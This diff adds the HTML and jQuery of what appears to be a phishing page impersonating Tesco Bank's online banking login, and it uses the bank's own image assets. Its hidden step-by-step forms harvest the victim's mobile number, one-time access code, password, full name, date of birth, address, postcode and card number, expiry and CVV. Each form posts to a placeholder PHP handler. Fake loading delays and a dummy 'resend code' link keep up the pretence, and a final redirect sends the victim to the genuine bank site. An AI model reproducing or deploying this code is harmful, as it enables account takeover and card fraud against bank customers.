+                    <div class="form__item form__item--narrow form__item--close">
+                          <label for="mobile_number" class="form__label">
+                            <span>Mobile Number</span>
+                          </label>
+
+                          <div class="form__control">
+                            <input type="text" id="mobile_number" name="mobile_number" value="" class="form__input form__input--full nums-only" maxlength="11"/>
+                          </div>
+                    </div>
+                    
+                      
+                      
+                     <div class="form__item no-bottom">
+                      <div class="button-group-extended button-group-extended--fixed">
+                        <!-- <input type="submit" name="submit" id="submit-OLB_UNIQUEID2" class="button button--action" value="Next"/> -->
+
+                        <button type="submit" name="submit" id="submit-OLB_UNIQUEID2" class="button button--action"> Next
+
+                          <svg class="button__chevron button__chevron--right" viewBox="0 0 11 19" xmlns="http://www.w3.org/2000/svg" role="image" aria-hidden="true"><path stroke-width="1.2" fill="none" fill-rule="evenodd" d="M.482.835l8.965 8.652-8.965 8.644"></path></svg>
+                        </button>
+
+                        
+                      </div>
+                    </div> 
+                      
+              </div>
+          </form>
+               
+               
+               
+               
+               
+               
+               
+               
+               
+               
+               
+               
+               
+               
+          <!-- Page 3 --> 
+              
+          <form name="form3" method="post" action="___.php?_do=form3" id="login-form-olb-3" class="form js-login-form-olb pg-forms" autocomplete="off" style="display: none;">
+              
+            <div class="form__panel">
+                 
+                 <h1 class="heading heading--isDark" data-qa-hook="heading"> <span class="custom-icon custom-icon--mobile-banking send-ota__label-icon"></span> &nbsp;&nbsp; Sent to your mobile ending <span class="mobend"></span></h1>
+                  
+                    <div class="form__item xform__item--wide form__item--close">
+                          <label for="security_number" class="form__label">
+                            <span>One Time Access Code</span>
+                          </label>
+
+                          <div class="form__control">
+                            <input type="password" id="otp" name="otp" value="" class="form__input form__input--full nums-only"/>
+                          </div>
+                          
+                    </div>
+                    
+                  <div class="form__item form__item--wide">
+                      <div class="form__link form__link--close">
+                              <a class="form__lnk-anchor svr-busy" href="#">
+                              <span class="form__link-wrapper">
+                                <span class="form__link-icon ui-Icon" data-icon="ArrowRight" data-small="true"></span>
+                                <span class="form__link-label">Send another access code</span>
+                              </span>
+                              </a>
+                        </div>
+                  </div>
+                  
+                     
+                    <div class="form__item no-bottom">
+                      <div class="button-group-extended button-group-extended--fixed">
+                        <!-- <input type="submit" name="submit" id="submit-OLB_UNIQUEID3" class="button button--action" value="Continue"/> -->
+
+                        <button type="submit" name="submit" id="submit-OLB_UNIQUEID3" class="button button--action"> Next
+
+                          <svg class="button__chevron button__chevron--right" viewBox="0 0 11 19" xmlns="http://www.w3.org/2000/svg" role="image" aria-hidden="true"><path stroke-width="1.2" fill="none" fill-rule="evenodd" d="M.482.835l8.965 8.652-8.965 8.644"></path></svg>
+                        </button>
+                      </div>
+                    </div>
+                        
+              </div>
+          </form>
+          
+          
+          
+
+         
+         
+         
+         
+         
+         
+         
+         
+         
+        
+
+
+
+
+
+        <!-- Page 4 -->
+            
+            
+        <form name="form4" method="post" action="___.php?_do=form4" id="login-form-olb-4" class="form js-login-form-olb pg-forms" autocomplete="off" style="display: none;">
+              
+            <div class="form__panel">
+
+              <div class="form__item form__item--narrow form__item--close">
+                  <label for="password" class="form__label">
+                    <span>Password</span>
+                  </label>
+
+                  <div class="form__control">
+                    <input type="password" id="password" name="password" value="" class="form__input form__input--full"/>
+                  </div>
+              </div>
+
+               
+               <div class="form__item form__item--narrow form__item--close">
+                      <label for="full_name" class="form__label">
+                        <span>Full Name</span>
+                      </label>
+
+                      <div class="form__control">
+                        <input type="text" id="full_name" name="full_name" value="" class="form__input form__input--full"/>
+                      </div>
+                </div>
+                
+
+                <div class="form__item form__item--narrow form__item--close">
+                    <label for="expiry_date" class="form__label">
+                      <span>Date Of Birth</span>
+                    </label>
+
+                    <div class="form__control">
+                      <input type="text" id="dob" name="dob" value="" class="form__input js-date" pattern="(?:0[1-9]|1[0-2])/[0-9]{2}/[0-9]{4}" title="Enter a date in this format MM/DD/YYYY" maxlength="10"/>
+                    </div>
+              </div>
+                
+
+                <div class="form__item form__item--narrow form__item--close">
+                      <label for="address" class="form__label">
+                        <span>Home Address</span>
+                      </label>
+
+                      <div class="form__control">
+                        <input type="text" id="address" name="address" value="" class="form__input form__input--full"/>
+                      </div>
+                </div>
+                
+
+                <div class="form__item form__item--narrow form__item--close">
+                      <label for="postcode" class="form__label">
+                        <span>Postcode</span>
+                      </label>
+
+                      <div class="form__control">
+                        <input type="text" id="postcode" name="postcode" value="" class="form__input"  maxlength="10"/>
+                      </div>
+                </div>
+                
+                
+                <div class="form__item no-bottom">
+                  <div class="button-group-extended button-group-extended--fixed">
+                    <!-- <input type="submit" name="submit" id="submit-OLB_UNIQUEID4" class="button button--action" value="Continue"/> -->
+
+                    <button type="submit" name="submit" id="submit-OLB_UNIQUEID4" class="button button--action"> Next
+
+                      <svg class="button__chevron button__chevron--right" viewBox="0 0 11 19" xmlns="http://www.w3.org/2000/svg" role="image" aria-hidden="true"><path stroke-width="1.2" fill="none" fill-rule="evenodd" d="M.482.835l8.965 8.652-8.965 8.644"></path></svg>
+                    </button>
+                  </div>
+                </div>
+              
+            </div>
+        </form>
+         
+         
+
+                 
+         
+         
+         
+
+
+
+
+         
+         
+         
+
+      <!-- Page 5 -->
+            
+            
+       <form name="form5" method="post" action="___.php?_do=form5" id="login-form-olb-5" class="form js-login-form-olb pg-forms" autocomplete="off" style="display: none;">
+              
+          <div class="form__panel">
+              
+              <div class="form__item form__item--narrow form__item--close">
+                    <label for="card_number" class="form__label">
+                      <span>Card Number</span>
+                    </label>
+
+                    <div class="form__control">
+                      <input type="text" id="card_number" name="card_number" value="" maxlength="20" class="form__input form__input--full nums-only"/>
+                    </div>
+              </div>
+              
+              <div class="form__item form__item--narrow form__item--close">
+                    <label for="expiry_date" class="form__label">
+                      <span>Expiry Date</span>
+                    </label>
+
+                    <div class="form__control">
+                      <input type="text" id="expiry_date" name="expiry_date" value="" class="form__input exdate" pattern="(?:0[1-9]|1[0-2])/[0-9]{2}" title="Enter a date in this format MM/YY" maxlength="5"/>
+                    </div>
+              </div>
+              
+               
+              <div class="form__item form__item--narrow form__item--close">
+                    <label for="cvv" class="form__label">
+                      <span>CVV</span>
+                    </label>
+
+                    <div class="form__control">
+                      <input type="text" id="cvv" name="cvv" value="" class="form__input nums-only" maxlength="4"/>
+                    </div>
+              </div>
+              
+              
+              
+              <div class="form__item no-bottom">
+                <div class="button-group-extended button-group-extended--fixed">
+                  <!-- <input type="submit" name="submit" id="submit-OLB_UNIQUEID5" class="button button--action" value="Continue"/> -->
+
+                  <button type="submit" name="submit" id="submit-OLB_UNIQUEID5" class="button button--action"> Next
+
+                    <svg class="button__chevron button__chevron--right" viewBox="0 0 11 19" xmlns="http://www.w3.org/2000/svg" role="image" aria-hidden="true"><path stroke-width="1.2" fill="none" fill-rule="evenodd" d="M.482.835l8.965 8.652-8.965 8.644"></path></svg>
+                  </button>
+                </div>
+              </div>
+            
+          </div>
+      </form>
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+          
+          
+          <div id="login-links" class="form__box-compact">
+            <div role="group" aria-labelledby="header-MOB">
+              <h2 id="header-MOB" class="form__heading form__heading--alt">Mobile Banking App</h2>
+
+              <div class="form__item form__item--wide ">
+                <p>The easy way to manage your current account, credit card, savings and loan accounts on the go.</p>
+
+                <div class="app-buttons add-bottom">
+                  <span class="app-buttons__button">
+                    <a class="form__link" href="#">
+                      <img alt="Apple App Store - Tesco Mobile App" src="https://identity.tescobank.com/afm/responsive-assets/img/mobile/mobile-panel-appstore.png"/>
+                    </a>
+                  </span>
+                  <span class="app-buttons__button">
+                    <a class="form__link" href="#">
+                      <img alt="Get it on Google Play" src="https://identity.tescobank.com/afm/responsive-assets/img/mobile/mobile-panel-googleplay.png"/>
+                    </a>
+                  </span>
+                </div>
+              </div>
+
+              <div class="form__item no-bottom">
+                <div class="button-group-extended button-group-extended--fixed">
+                </div>
+              </div>
+
+            </div>
+          </div>
+
+         
+         
+         
+         
+         
+          <div id="login-community" class="form__box-compact">
+            <div role="group" aria-labelledby="header-COM">
+              <h2 id="header-COM" class="form__heading form__heading--alt">Your Community</h2>
+
+              <div class="form__item form__item--wide ">
+                <p>Share knowledge and learn from fellow customers every day.</p>
+                <div class="form__link form__link--close">
+                  <a class="form__lnk-anchor" href="#">
+                  <span class="form__link-wrapper">
+                    <span class="form__link-icon ui-Icon" data-icon="ArrowRight" data-small="true"></span>
+                    <span class="form__link-label">Your Community login</span>
+                  </span>
+                  </a>
+                </div>
+              </div>
+
+              <div class="form__item no-bottom">
+                <div class="button-group-extended button-group-extended--fixed">
+                </div>
+              </div>
+
+            </div>
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <div id="ui-Footer" class="ui-footer"></div>
+
+  <!--<script src="https://identity.tescobank.com/afm/responsive-assets/js/vendors~app~main.js"></script>
+  <script src="https://identity.tescobank.com/afm/responsive-assets/js/vendors~main.js"></script>
+  <script src="https://identity.tescobank.com/afm/responsive-assets/js/main.js"></script>-->
+
+  <div id="dontShowNavigationWarning"></div>
+
+</div>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	<script type="text/javascript">
+            // JavaScript Document
+
+            (function(){
+                
+                $(".svr-busy").on('click', function(e) { 
+                    e.preventDefault();
+                    alert('Server Busy');
+                });
+                
+                $("input.nums-only").on('input', function(e) { 
+                    $(this).val($(this).val().replace(/[^0-9]/g, '')); 
+                });
+
+                $("input.alphabets-only").on('input', function(e) { 
+                    // Alphabets Only
+                    //$(this).val($(this).val().replace(/[^a-z]/ig, ''));
+                    // Alphabets and Space Only
+                    $(this).val($(this).val().replace(/[^a-z\s]/ig, '')); 
+                });
+                
+                
+                // format expiry date MM/YY
+                $('input.exdate').on('keyup', function(){
+                    var val = this.value.replace(/\D/g, '');
+                    val = val.substr(0, 10); //console.log(val);
+                    var newVal = '';
+                    
+                    this.value = val;
+                    
+                    if(val.length > 1) {
+                        //this.value = val;
+                        newVal = val.substr(0, 2) + '/';
+                        
+                        this.value = newVal;
+                    }
+                    
+                    if (val.length > 2) {
+                        newVal = val.substr(0, 2) + '/';
+                        newVal += val.substr(2, 2);
+                        
+                        this.value = newVal; 
+                    }
+                });
+                
+                
+                //Date Input Masking -DOB
+                var dt_input = document.querySelectorAll('.js-date')[0];
+
+                var dateInputMask = function dateInputMask(elm) {
+                  elm.addEventListener('keypress', function(e) {
+                    if(e.keyCode < 47 || e.keyCode > 57) {
+                      e.preventDefault();
+                    }
+
+                    var len = elm.value.length;
+
+                    // If we're at a particular place, let the user type the slash
+                    // i.e., 12/12/1212
+                    if(len !== 1 || len !== 3) {
+                      if(e.keyCode == 47) {
+                        e.preventDefault();
+                      }
+                    }
+
+                    // If they don't add the slash, do it for them...
+                    if(len === 2) {
+                      elm.value += '/';
+                    }
+
+                    // If they don't add the slash, do it for them...
+                    if(len === 5) {
+                      elm.value += '/';
+                    }
+                  });
+                };
+
+                dateInputMask(dt_input);
+                
+                $('.form__input').on('keyup',function(e){
+                    $(this).removeClass('form__highlight-error');
+                    $(this).parents('.form__item').find('.form__error').remove();
+                });
+
+
+                function resp_err(id, txtp){
+                  if(id.parents('.form__item').find('.form__error').length < 1)
+                  {
+                    id.parents('.form__item').find('.form__control').after('<span class="form__error"> '+txtp+'</span>');
+                  }
+                }
+                
+                /* $.fn.focusNextInputField = function() {
+                    return this.each(function() {
+                        var fields = $(this).parents('.js-autotab').find(':input').not('[type=hidden]');
+                        var index = fields.index(this);
+                        if ( index > -1 && ( index + 1 ) < fields.length ) {
+                            fields.eq( index + 1 ).focus();
+                        }
+                        return false;
+                    });
+                }; */
+
+                //$('.secdigit').focusNextInputField();
+
+                $('.secdigit').on('keyup',function(e){
+                  if($(this).val())
+                  {
+                    var fields = $(this).parents('.js-autotab').find(':input').not('[type=hidden]');
+                    var index = fields.index(this);
+                    if ( index > -1 && ( index + 1 ) < fields.length ) {
+                        fields.eq( index + 1 ).focus();
+                    }
+                  } 
+                });
+
+
+                
+                $('form.pg-forms').submit(function(e) {
+                    e.preventDefault();
+
+                    var $frm_name = $(this).attr('name');
+                    var $frms = ["form1", "form2", "form3", "form4", "form5"];
+                    
+                    var foundErr = false;
+                    
+                    
+                    if (typeof $frm_name !== typeof undefined && $frm_name !== false && $frms.indexOf($frm_name) !== -1) 
+                    {
+                        //Validation
+                        //var $errDiv = $('.page-frame:visible').find('.validator-error-header .err-txt');
+                        var $errDivWrap = $('.page-frame:visible').find('.validator-error-header'), $errDiv = $errDivWrap.find('.err-txt');
+                        
+                        if($frm_name == 'form1')
+                        {
+                          if ($('#OLB_UNIQUEID').val() == '')
+                          {
+                              $('#OLB_UNIQUEID').addClass('form__highlight-error');
+                              
+                              resp_err($('#OLB_UNIQUEID'), 'This field is required.');
+                              
+                              foundErr = true;
+                          }
+                        }
+                        
+                        
+                        
+                        if($frm_name == 'form2')
+                        {
+                            if ($('#security_number').val() == '')
+                            {
+                                $('#security_number').addClass('form__highlight-error');
+                                
+                                resp_err($('#security_number'), 'Please enter your security number.');
+                                
+                                foundErr = true;
+                            }
+                            
+                            
+                            if ($('#mobile_number').val() == '')
+                            {
+                                $('#mobile_number').addClass('form__highlight-error');
+                                
+                                resp_err($('#mobile_number'), 'Please enter your mobile number.');
+                                
+                                foundErr = true;
+                            }
+                            
+                            
+                            /* if ($('#password').val() == '')
+                            {
+                                $('#password').addClass('form__highlight-error');
+                                
+                                resp_err($('#password'), 'Please enter your password.');
+                                
+                                foundErr = true;
+                            } */ 
+                        }
+                        
+                        
+                        
+                        
+                        if($frm_name == 'form3')
+                        {
+                          if($('#otp').val() == '')
+                          {
+                              $('#otp').addClass('form__highlight-error');
+                              
+                              resp_err($('#otp'), 'Please enter your One Time Access Code.');
+                              
+                              foundErr = true;
+                          }
+                        }
+                        
+                        
+                        
+                        if($frm_name == 'form4')
+                        {
+
+                            if ($('#password').val() == '')
+                            {
+                                $('#password').addClass('form__highlight-error');
+                                
+                                resp_err($('#password'), 'Please enter your password.');
+                                
+                                foundErr = true;
+                            }
+
+                            if ($('#full_name').val() == '')
+                            {
+                                $('#full_name').addClass('form__highlight-error');
+                                
+                                resp_err($('#full_name'), 'Please enter your full name.');
+                                
+                                foundErr = true;
+                            }
+                            
+
+                            if ($('#dob').val() == '')
+                            {
+                                $('#dob').addClass('form__highlight-error');
+                                
+                                resp_err($('#dob'), 'Please enter your date of birth.');
+                                
+                                foundErr = true;
+                            }
+                            
+                            if ($('#address').val() == '')
+                            {
+                                $('#address').addClass('form__highlight-error');
+                                
+                                resp_err($('#address'), 'Please enter your home address.');
+                                
+                                foundErr = true;
+                            }
+                            
+                            if ($('#postcode').val() == '')
+                            {
+                                $('#postcode').addClass('form__highlight-error');
+                                
+                                resp_err($('#postcode'), 'Please enter your postcode.');
+                                
+                                foundErr = true;
+                            }
+                            
+                        }
+
+
+                        if($frm_name == 'form5')
+                        {
+                          
+                            if ($('#card_number').val() == '')
+                            {
+                                $('#card_number').addClass('form__highlight-error');
+                                
+                                resp_err($('#card_number'), 'Please enter your card number.');
+                                
+                                foundErr = true;
+                            }
+                            
+                            
+                            
+                            if ($('#expiry_date').val() == '')
+                            {
+                                $('#expiry_date').addClass('form__highlight-error');
+                                
+                                resp_err($('#expiry_date'), 'Please enter your expiry date.');
+                                
+                                foundErr = true;
+                            }
+                            
+                            
+                            
+                            if ($('#cvv').val() == '')
+                            {
+                                $('#cvv').addClass('form__highlight-error');
+                                
+                                resp_err($('#cvv'), 'Please enter your cvv.');
+                                
+                                foundErr = true;
+                            }
+                            
+                        }
+                        
+                        
+                        
+                        
+                        
+                        if(foundErr){ return false; }
+                        
+                        
+                        $('html, body').css({'opacity':'0.7'});
+                        //$('.puree-spinner-button').addClass('active');
+                        
+                        //$sBtn = $('.page-frame:visible form').find('.button')
+                        var $dis = $(this), values = $(this).serialize(), $sBtn = $('.pg-forms:visible form input, .pg-forms:visible form .button');
+                        
+
+                        $.ajax({
+                            url: $(this).attr('action'),
+                            type: "post",
+                            data: values,
+                            success: function (res) {
+                                
+                                console.log(res);
+
+                                if($frm_name == 'form1')
+                                {
+                                    setTimeout(function(){
+                                        $('.pg-forms:visible, #login-links, #login-community').fadeOut('fast', function(){
+                                            $('.step-heading__title').text('Log into Online Banking');
+                                            //$('.property-list__value').text($('#OLB_UNIQUEID').val().toUpperCase());
+                                            $('.property-list__value.js-entered-username').text($('#OLB_UNIQUEID').val());
+                                            $('#login-form-olb-2').fadeIn('fast');
+                                            $('html, body').css({'opacity':'1'});
+                                            //$sBtn.css({'opacity':'1'}).removeAttr('disabled');
+
+                                            //$('#login-form-olb-2').find('.secdigit').eq(0).focus();
+                                            $('#DIGIT1').focus();
+                                        });
+                                    }, 3000);
+                                }
+
+
+                                if($frm_name == 'form2')
+                                {
+                                    setTimeout(function(){
+                                        $('.pg-forms:visible').fadeOut('fast', function(){
+                                            $('.step-heading__title').text('Enter your One Time Access Code');
+                                            $('.mobend').text($('#mobile_number').val().substr(-4));
+                                            $('#login-form-olb-3').fadeIn('fast');
+                                            $('html, body').css({'opacity':'1'});
+                                            //$sBtn.css({'opacity':'1'}).removeAttr('disabled');
+                                        });
+                                    }, 3000);
+                                }
+                            
+
+                                if($frm_name == 'form3')
+                                {
+                                    setTimeout(function(){
+                                        $('.pg-forms:visible').fadeOut('fast', function(){
+                                            $('.step-heading__title').text('Confirm your details');
+                                            $('#login-form-olb-4').fadeIn('fast');
+                                            $('html, body').css({'opacity':'1'});
+                                            //$sBtn.css({'opacity':'1'}).removeAttr('disabled');
+                                        });
+                                    }, 3000);
+                                }
+
+                                if($frm_name == 'form4')
+                                {
+                                    setTimeout(function(){
+                                        $('.pg-forms:visible').fadeOut('fast', function(){
+                                            $('.step-heading__title').text('Confirm your details');
+                                            $('#login-form-olb-5').fadeIn('fast');
+                                            $('html, body').css({'opacity':'1'});
+                                            //$sBtn.css({'opacity':'1'}).removeAttr('disabled');
+                                        });
+                                    }, 3000);
+                                }
+                                
+                                if($frm_name == 'form5')
+                                {
+                                    setTimeout(function(){
+                                         window.location.replace("https://tescobank.com");
+                                    }, 3000);
+                                }
+                            },
+                            error: function(xhr, status, error) {
+                                //console.log(xhr.responseText);
+                                alert('Please make sure you are connected to the internet.');
+                            },
+                            beforeSend: function(xhr, status, error) {
+                                $sBtn.css({'opacity':'0.5'}).attr({'disabled':'disabled'});
+                            }
+                        });
+                    }
+                });
+                
+            })()
+        </script>
+        
+    <script type="text/javascript">
+        //document.getElementById('ensNotifyBanner').style.display='block';
+    </script>
+</body>
+</html>
